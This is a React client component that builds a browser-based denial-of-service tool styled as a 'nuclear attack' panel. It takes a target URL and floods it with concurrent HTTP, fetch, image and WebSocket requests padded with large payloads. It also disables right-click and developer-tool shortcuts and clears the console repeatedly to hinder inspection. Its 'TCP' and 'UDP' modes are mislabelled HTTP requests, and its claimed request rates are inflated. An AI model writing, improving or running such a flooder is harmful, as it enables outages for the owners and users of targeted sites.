"use client";

import React, { useState, useEffect, useRef } from 'react';

const NuclearAttackCommand = () => {
  const [isAttacking, setIsAttacking] = useState(false);
  const [strikeCount, setStrikeCount] = useState(0);
  const [attackPower, setAttackPower] = useState(100);
  const [targetUrl, setTargetUrl] = useState('');
  const [health, setHealth] = useState(100);
  const [ttd, setTtd] = useState(0);
  const [radiation, setRadiation] = useState("0MB");
  const [warningText, setWarningText] = useState('⚠️ WARNING: EXTREME POWER - TARGET WILL CRASH IN SECONDS ⚠️');

  const attackIntervalRef = useRef<NodeJS.Timeout | null>(null);
  const statsIntervalRef = useRef<NodeJS.Timeout | null>(null);

  // Security Protocols (Right click & Keyboard shortcuts)
  useEffect(() => {
    const handleContextMenu = (e: MouseEvent) => e.preventDefault();
    const handleKeyDown = (e: KeyboardEvent) => {
      if (
        e.keyCode === 123 || 
        (e.ctrlKey && e.shiftKey && e.keyCode === 73) || 
        (e.ctrlKey && e.shiftKey && e.keyCode === 74) || 
        (e.ctrlKey && e.keyCode === 85) || 
        (e.ctrlKey && e.keyCode === 83)
      ) {
        e.preventDefault();
      }
      if (e.key === 'Escape' && isAttacking) {
        emergencyStop();
      }
    };

    document.addEventListener('contextmenu', handleContextMenu);
    document.addEventListener('keydown', handleKeyDown);
    const consoleClear = setInterval(() => console.clear(), 100);

    return () => {
      document.removeEventListener('contextmenu', handleContextMenu);
      document.removeEventListener('keydown', handleKeyDown);
      clearInterval(consoleClear);
    };
  }, [isAttacking]);

  // Attack Functions
  const nuclearHttpFlood = async (url: string) => {
    for (let i = 0; i < 100; i++) {
      try {
        let xhr = new XMLHttpRequest();
        xhr.open('GET', url + '?nuclear=' + Math.random() + '&' + 'X'.repeat(5000), true);
        xhr.timeout = 1;
        xhr.send();

        fetch(url + '?atomic=' + Math.random(), {
          mode: 'no-cors',
          cache: 'no-store',
          headers: { 'X-Nuclear': 'X'.repeat(10000) }
        }).catch(() => {});

        let img = new Image();
        img.src = url + '/bomb_' + Math.random() + '?' + 'X'.repeat(2000);
      } catch (e) {}
    }
    setStrikeCount(prev => prev + 100);
  };

  const atomTcpFlood = async (url: string) => {
    for (let i = 0; i < 200; i++) {
      try {
        let xhr = new XMLHttpRequest();
        xhr.open('GET', url + '?syn=' + Math.random(), true);
        xhr.timeout = 1;
        xhr.send();
        
        let ws = new WebSocket(url.replace('http', 'ws'));
        setTimeout(() => ws.close(), 1);
      } catch (e) {}
    }
    setStrikeCount(prev => prev + 200);
  };

  const hydrogenUdpFlood = async (url: string) => {
    for (let i = 0; i < 500; i++) {
      try {
        fetch(url + '?udp=' + Math.random(), {
          mode: 'no-cors',
          body: 'X'.repeat(10000)
        }).catch(() => {});

        let xhr = new XMLHttpRequest();
        xhr.open('POST', url + '?udp=' + Math.random(), true);
        xhr.send('X'.repeat(10000));
      } catch (e) {}
    }
    setStrikeCount(prev => prev + 500);
  };

  const superNovaAttack = async (url: string) => {
    for (let i = 0; i < 1000; i++) {
      try {
        let xhr = new XMLHttpRequest();
        xhr.open('GET', url + '?nova=' + Math.random() + '&' + 'X'.repeat(10000), true);
        xhr.timeout = 1;
        xhr.send();

        fetch(url + '?super=' + Math.random(), {
          mode: 'no-cors',
          body: 'X'.repeat(50000)
        }).catch(() => {});

        let img = new Image();
        img.src = url + '/nova_' + Math.random() + '?' + 'X'.repeat(10000);
        
        let ws = new WebSocket(url.replace('http', 'ws'));
        ws.send('X'.repeat(10000));
        setTimeout(() => ws.close(), 1);
      } catch (e) {}
    }
    setStrikeCount(prev => prev + 1000);
  };

  const launchNuclearStrike = (url: string) => {
    for (let i = 0; i < 50; i++) {
      (async () => {
        while (isAttacking) {
          try {
            if (attackPower === 100) await nuclearHttpFlood(url);
            else if (attackPower === 200) await atomTcpFlood(url);
            else if (attackPower === 300) await hydrogenUdpFlood(url);
            else await superNovaAttack(url);
            await new Promise(r => setTimeout(r, 0));
          } catch (e) {
            setStrikeCount(prev => prev + 1);
          }
        }
      })();
    }
  };

  useEffect(() => {
    if (isAttacking) {
      launchNuclearStrike(targetUrl);
      
      let warningCount = 0;
      const warningInterval = setInterval(() => {
        warningCount++;
        setWarningText(`⚠️ NUCLEAR RADIATION: ${warningCount * 10}% ⚠️`);
        if (strikeCount > 100000) {
          setWarningText('💀 TARGET DESTROYED - MISSION COMPLETE 💀');
        }
      }, 500);

      const statsInterval = setInterval(() => {
        const rad = (strikeCount * 0.5).toFixed(0);
        setRadiation(Number(rad) > 999 ? (Number(rad) / 1000).toFixed(1) + 'GB' : rad + 'MB');
        
        const currentHealth = Math.max(0, 100 - Math.floor(strikeCount / 1000));
        setHealth(currentHealth);
        setTtd(Math.max(0, Math.floor(currentHealth / 10)));
      }, 100);

      return () => {
        clearInterval(warningInterval);
        clearInterval(statsInterval);
      };
    }
  }, [isAttacking]);

  const handleFire = () => {
    if (isAttacking) {
      emergencyStop();
      return;
    }
    if (!targetUrl.startsWith('http')) {
      alert('ERROR: http:// or https:// দাও!');
      return;
    }
    setIsAttacking(true);
    setStrikeCount(0);
  };

  const emergencyStop = () => {
    setIsAttacking(false);
    window.stop();
  };

  return (
    <div className="flex justify-center align-center h-screen bg-black overflow-hidden font-mono m-0 p-0 text-white select-none">
      <style dangerouslySetInnerHTML={{ __html: `
        @keyframes nuclearPulse {
          0% { border-color: #ff0000; box-shadow: 0 0 100px rgba(255,0,0,0.7); }
          50% { border-color: #15ff00; box-shadow: 0 0 150px rgba(0, 255, 42, 0.9); }
          100% { border-color: #ff0000; box-shadow: 0 0 100px rgba(255,0,0,0.7); }
        }
        @keyframes nuclearText {
          0% { opacity: 1; text-shadow: 0 0 30px red; }
          50% { opacity: 0.9; text-shadow: 0 0 50px #ff6600; }
          100% { opacity: 1; text-shadow: 0 0 30px red; }
        }
        @keyframes warningBlink {
          0% { opacity: 1; }
          50% { opacity: 0.5; }
          100% { opacity: 1; }
        }
        @keyframes nuclearButton {
          0% { transform: scale(1); }
          50% { transform: scale(1.05); box-shadow: 0 0 100px red; }
          100% { transform: scale(1); }
        }
      `}} />
      
      <div className="control-panel self-center w-[1100px] bg-[#0f0000] border-4 p-[30px] rounded-[20px] relative" 
           style={{ animation: 'nuclearPulse 0.5s infinite', borderColor: '#00f7ff' }}>
        
        <div className="header text-center mb-5">
          <h1 className="text-[48px] m-0" style={{ color: '#00f7ff', animation: 'nuclearText 0.3s infinite' }}>💀 NUCLEAR ATTACK MODE 💀</h1>
          <div className="warning text-[#00ffd5] text-[20px] font-bold" style={{ animation: 'warningBlink 0.1s infinite' }}>
            {warningText}
          </div>
        </div>

        <div className="input-group mb-5">
          <label className="block mb-1">🎯 TARGET URL</label>
          <input 
            type="text" 
            value={targetUrl} 
            onChange={(e) => setTargetUrl(e.target.value)}
            className="w-full p-[15px] bg-[#1a0000] border-2 border-[#660000] color-[#ff0000] text-[16px] font-bold outline-none"
            style={{ color: '#ff0000' }}
          />
        </div>

        <div className="attack-options grid grid-cols-4 gap-[15px] my-[25px]">
          {[
            { id: 100, title: '🔥 NUCLEAR HTTP', desc: '100,000 req/sec' },
            { id: 200, title: '💀 ATOM TCP', desc: '200,000 packets/sec' },
            { id: 300, title: '⚡ HYDROGEN UDP', desc: '500 MB/sec' },
            { id: 500, title: '🌋 SUPER NOVA', desc: 'ALL MAXIMUM' }
          ].map((option) => (
            <div 
              key={option.id}
              onClick={() => setAttackPower(option.id)}
              className={`attack-card p-[20px] text-center cursor-pointer border-2 transition-all ${attackPower === option.id ? 'selected border-[#ff0000] bg-[#330000]' : 'bg-[#1a0000] border-[#00e1ff]'}`}
              style={attackPower === option.id ? { boxShadow: '0 0 50px red', border: '4px solid #ff0000' } : {}}
            >
              <h3 className="m-0 text-[18px]">{option.title}</h3>
              <p className="m-0 mt-2 text-[14px]">{option.desc}</p>
            </div>
          ))}
        </div>

        <div className="stats-grid grid grid-cols-4 gap-[15px] my-[25px]">
          {[
            { label: 'NUCLEAR STRIKES', value: strikeCount.toLocaleString() },
            { label: 'RADIATION MB/s', value: radiation },
            { label: 'TARGET HEALTH', value: health <= 0 ? '0% 💀' : `${health}%` },
            { label: 'TIME TO DEATH', value: health <= 0 ? 'DEAD' : `${ttd}s` }
          ].map((stat, i) => (
            <div key={i} className="stat-box bg-[#0f0000] border-2 border-[#660000] p-[20px] text-center">
              <div className="text-[12px] text-gray-400 mb-1">{stat.label}</div>
              <div className="stat-value text-[#ff0000] text-[40px] font-bold" style={{ textShadow: '0 0 20px red' }}>
                {stat.value}
              </div>
            </div>
          ))}
        </div>

        <button 
          onClick={handleFire}
          className="btn-nuclear w-full p-[30px] text-white text-[32px] font-bold border-none cursor-pointer my-[20px]"
          style={{ 
            background: 'linear-gradient(45deg, #660000, #ff0000)',
            animation: isAttacking ? 'none' : 'nuclearButton 0.3s infinite'
          }}
        >
          {isAttacking ? '💥 NUCLEAR STRIKE IN PROGRESS 💥' : '💣 LAUNCH NUCLEAR ATTACK 💣'}
        </button>

        <div 
          style={{ textAlign: 'center', color: '#660000', cursor: 'pointer' }} 
          onClick={emergencyStop}
          className="uppercase font-bold hover:text-red-500"
        >
          ⚠️ EMERGENCY STOP ⚠️
        </div>
      </div>
    </div>
  );
};

export default NuclearAttackCommand;